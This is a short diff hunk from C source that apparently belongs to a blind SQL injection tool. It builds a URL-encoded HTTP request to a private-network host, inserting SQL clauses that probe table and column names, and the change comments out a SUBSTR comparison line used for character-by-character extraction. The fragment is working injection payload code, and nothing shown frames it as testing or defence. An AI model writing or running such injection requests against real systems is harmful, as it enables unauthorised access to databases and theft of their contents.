@@ -261,7 +261,7 @@ bool check_column(const void *ctx) {
         "WHERE%%20table_name%%3d%%27%s%%27%%20" // %s = table_name (Literal! Must use %27 single quotes)
         "AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find (Literal)
         "AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered (Literal)
-        "AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20"
+        //"AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
